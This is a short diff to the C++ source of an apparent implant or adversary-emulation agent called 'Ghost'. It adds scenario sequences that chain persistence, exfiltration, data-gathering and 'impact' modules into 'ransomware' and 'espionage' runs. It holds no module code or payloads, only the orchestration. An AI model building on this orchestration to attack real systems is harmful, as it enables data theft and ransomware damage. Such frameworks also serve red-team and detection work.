@@ -33,7 +33,7 @@ Ghost::Ghost() {
     modules["EXFIL"] = std::make_unique<Exfiltration>();
     #endif
     #ifdef FEATURE_GATHERING
-    modules["GATHERING"] = std::make_unique<Gathering>();
+    modules["GATHER"] = std::make_unique<Gathering>();
     #endif
 
     auto timestamp = std::chrono::system_clock::now().time_since_epoch().count();
@@ -50,6 +50,7 @@ Ghost::Ghost() {
     this->pendingResults = json::array();
 }
 
+#ifdef SCENARIO_MODE
 // TODO: instead of this make a map of scenarios (like with modules) and just scenario->run() or smth like that
 void Ghost::runScenario(ScenarioType type) {
     LOG_INFO("[SCENARIO MODE] Initializing...")
@@ -57,9 +58,15 @@ void Ghost::runScenario(ScenarioType type) {
     switch (type) {
         #ifdef SCENARIO_RANSOMWARE
         case ScenarioType::RANSOMWARE:
+            modules["PERSIST"]->execute();  // TODO: make this more granular with specific method instead of the orchestrating module
+            modules["EXFIL"]->execute();
+            modules["IMPACT"]->execute();
             break;
         #elif defined(SCENARIO_ESPIONAGE)
         case ScenarioType::ESPIONAGE:
+            modules["GATHER"]->execute();
+            modules["EXFIL"]->execute();
+            modules["PERSIST"]->execute();
             break;
         #endif
         default:
@@ -67,6 +74,7 @@ void Ghost::runScenario(ScenarioType type) {
             break;
     }
 }
+#endif
 
 bool Ghost::reg() {
     LOG_INFO("Trying to register GHOST [{}]", this->uuid)
